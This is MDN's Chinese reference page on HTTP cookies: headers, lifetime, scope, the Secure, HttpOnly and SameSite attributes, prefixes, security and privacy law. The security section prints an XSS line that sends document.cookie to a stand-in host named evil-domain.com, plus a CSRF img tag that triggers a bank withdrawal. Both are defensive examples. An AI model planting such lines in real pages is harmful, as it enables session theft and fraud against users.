---
title: HTTP Cookie
slug: Web/HTTP/Cookies
---

{{HTTPSidebar}}

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于[无状态](/zh-CN/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)的 HTTP 协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 [Web storage API](/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](/zh-CN/docs/Web/API/IndexedDB_API) 。

> **备注：** 要查看 Cookie 存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用**存储查看**（[Storage Inspector](/zh-CN/docs/Tools/Storage_Inspector) ）功能，并在存储树上选中**Cookie**。

## 创建 Cookie

当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 {{HTTPHeader("Set-Cookie")}} 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 {{HTTPHeader("Cookie")}} 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

### `Set-Cookie 响应头部`和`Cookie 请求头部`

服务器使用 {{HTTPHeader("Set-Cookie")}} 响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：

```plain
Set-Cookie: <cookie 名>=<cookie 值>
```

服务器通过该头部告知客户端保存 Cookie 信息。

```plain
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]
```

现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 {{HTTPHeader("Cookie")}} 请求头部再发送给服务器。

```plain
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

> **备注：** 如何在以下几种服务端程序中设置 `Set-Cookie` 响应头信息：
>
> - [PHP](https://secure.php.net/manual/en/function.setcookie.php)
> - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
> - [Python](https://docs.python.org/3/library/http.cookies.html)
> - [Ruby on Rails](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

### 定义 Cookie 的生命周期

Cookie 的生命周期可以通过两种方式定义：

- 会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。
- 持久性 Cookie 的生命周期取决于过期时间（`Expires`）或有效期（`Max-Age`）指定的一段时间。

例如：

```plain
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

> **备注：** 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止[会话固定攻击（session fixation attacks）](/zh-CN/docs/Web/Security/Types_of_attacks#Session_fixation)，在该攻击中第三方可以重用用户的会话。

### 限制访问 Cookie

有两种方法可以确保 `Cookie` 被安全发送，并且不会被意外的参与者或脚本访问：`Secure` 属性和`HttpOnly` 属性。

标记为 `Secure` 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 {{Glossary("MitM", "man-in-the-middle")}} 攻击者的攻击。但即便设置了 `Secure` 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，`Secure` 标记也无法提供确实的安全保障，例如，可以访问客户端硬盘的人可以读取它。

> **备注：** 从 Chrome 52 和 Firefox 52 开始，不安全的站点（`http:`）无法使用 Cookie 的 `Secure` 标记。

JavaScript {{domxref("Document.cookie")}} API 无法访问带有 `HttpOnly` 属性的 cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `HttpOnly` 属性。此预防措施有助于缓解[跨站点脚本（XSS）](/zh-CN/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss) 攻击。

示例：

```plain
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### Cookie 的作用域

`Domain` 和 `Path` 标识定义了 Cookie 的*作用域：*即允许 Cookie 应该发送给哪些 URL。

#### Domain 属性

`Domain` 指定了哪些主机可以接受 Cookie。如果不指定，默认为 {{Glossary("origin")}}，**不包含子域名**。如果指定了`Domain`，则一般包含子域名。因此，指定 `Domain` 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。

例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如`developer.mozilla.org`）。

> **备注：** 当前大多数浏览器遵循 [RFC 6265](http://tools.ietf.org/html/rfc6265)，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：`Domain=.mozilla.org`

#### Path 属性

`Path` 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

#### SameSite attribute

`SameSite` Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中 {{Glossary("Site")}} 由可注册域定义），从而可以阻止跨站请求伪造攻击（{{Glossary("CSRF")}}）。

SameSite cookies 是相对较新的一个字段，[所有主流浏览器都已经得到支持](/zh-CN/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility)。

下面是例子：

```js
Set-Cookie: key=value; SameSite=Strict
```

SameSite 可以有下面三种值：

- **`None`**。浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。
- **`Strict`**。浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文“Cookie 的作用域”所述）
- **`Lax`**。与 **`Strict`** 类似，但用户从外部站点导航至 URL 时（例如通过链接）除外。在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接

> **备注：** 以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。大多数主流浏览器正在将 [SameSite 的默认值迁移至 Lax](https://www.chromestatus.com/feature/5088147346030592)。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。

#### Cookie prefixes

cookie 的机制使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。

子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅[会话劫持（session fixation）](/zh-CN/docs/Web/Security/Types_of_attacks#Session_fixation)。

但是，作为[深度防御措施](<https://en.wikipedia.org/wiki/Defense_in_depth_(computing)>)，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：

- `__Host-`
  - : 如果 cookie 名称具有此前缀，则仅当它也用 `Secure` 属性标记，是从安全来源发送的，不包括 `Domain` 属性，并将 `Path` 属性设置为 `/` 时，它才在 {{HTTPHeader("Set-Cookie")}} 标头中接受。这样，这些 cookie 可以被视为 "domain-locked”。
- `__Secure-`
  - : 如果 cookie 名称具有此前缀，则仅当它也用 `Secure` 属性标记，是从安全来源发送的，它才在 {{HTTPHeader("Set-Cookie")}} 标头中接受。该前缀限制要弱于 `__Host-` 前缀。

带有这些前缀点 Cookie，如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。

> **备注：** 在应用程序服务器上，Web 应用程序**必须**检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 {{HTTPHeader("Cookie")}} 标头中发送前缀之前，**不会**从 cookie 中剥离前缀。

有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 [Prefixes section of the Set-Cookie reference article](/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes)。

#### JavaScript 通过 Document.cookie 访问 Cookie

通过 {{domxref("Document.cookie")}} 属性可创建新的 Cookie，也可通过该属性访问非`HttpOnly`标记的 Cookie。

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。

请留意在[安全](/zh-CN/docs/Web/HTTP/Cookies#Security)章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。

## 安全

> **备注：** 信息被存在 Cookie 中时，需要明白 cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。当机器处于不安全环境时，切记*不能*通过 HTTP Cookie 存储、传输敏感信息。

缓解涉及 Cookie 的攻击的方法：

- 使用 `HttpOnly` 属性可防止通过 JavaScript 访问 cookie 值。
- 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 `SameSite` 属性设置为`Strict` 或 `Lax`。（请参见上方的 [SameSite Cookie](/zh-CN/docs/Web/HTTP/Cookies)。）在[支持 SameSite 的浏览器](/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility)中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。

### 会话劫持和 XSS

在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 {{Glossary("XSS")}} 攻击。

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

### 跨站请求伪造（CSRF）

[维基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)已经给了一个比较好的 {{Glossary("CSRF")}} 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止 {{Glossary("XSS")}}；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>)。

## 跟踪和隐私

### 第三方 Cookie

Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为*第一方 cookie（first-party cookie）*。如果域不同，则它是*第三方 cookie（third-party cookie）*。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，[types of cookies used by Google](https://policies.google.com/technologies/types)。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方 cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。

如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对 Cookie 制订了相应的法规，可以查看维基百科上例子[cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement)。

### Cookie 相关规定

涉及使用 Cookie 的法律或法规包括：

- 欧盟通用数据隐私法规（GDPR）
- 欧盟的《隐私权指令》
- 加州消费者隐私法

这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过 2500 万美元的实体。）

这些法规包括以下要求：

- 向用户表明您的站点使用 cookie。
- 允许用户选择不接收某些或所 ​​ 有 cookie。
- 允许用户在不接收 Cookie 的情况下使用大部分服务。

可能还存在其他法规来管理您当地的 Cookie。您有责任了解并遵守这些规定。有些公司提供 "cookie banner" 代码，可帮助您遵守这些法规。

可以通过[维基百科的相关内容](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)获取最新的各国法律和更精确的信息。

#### 禁止追踪 Do-Not-Track

虽然并没有法律或者技术手段强制要求使用 {{HTTPHeader("DNT")}}，但是通过{{HTTPHeader("DNT")}} 可以告诉 Web 程序不要对用户行为进行追踪或者跨站追踪。查看{{HTTPHeader("DNT")}} 以获取更多信息。

#### 欧盟 Cookie 指令

关于 Cookie，欧盟已经在[2009/136/EC 指令](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136)中提了相关要求，该指令已于 2011 年 5 月 25 日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。

该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。

### 僵尸 Cookie 和删不掉的 Cookie

Cookie 的一个极端使用例子是僵尸 Cookie（或称之为“删不掉的 Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 [Web storage API](/zh-CN/docs/Web/API/Web_Storage_API)、Flash 本地共享对象或者其他技术手段来达到的。相关内容可以看：

- [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
- [在维基百科上查看僵尸 Cookie](https://en.wikipedia.org/wiki/Zombie_cookie)

## 在浏览器中存储信息的其他方式

在浏览器中存储数据的另一种方法是 [Web Storage API](/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API)。[window.sessionStorage](/zh-CN/docs/Web/API/Window/sessionStorage) 和[window.localStorage](/zh-CN/docs/Web/API/Window/localStorage) 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie 大，并且永远不会发送到服务器。

可以使用 [IndexedDB API](/zh-CN/docs/Web/API/IndexedDB_API) 或基于它构建的库来存储更多结构化的数据。

## 了解更多

- {{HTTPHeader("Set-Cookie")}}
- {{HTTPHeader("Cookie")}}
- {{domxref("Document.cookie")}}
- {{domxref("Navigator.cookieEnabled")}}
- [Inspecting cookies using the Storage Inspector](/zh-CN/docs/Tools/Storage_Inspector)
- [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
- [Nicholas Zakas article on cookies](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/)
- [Nicholas Zakas article on cookies and security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/)
- [HTTP cookie on Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
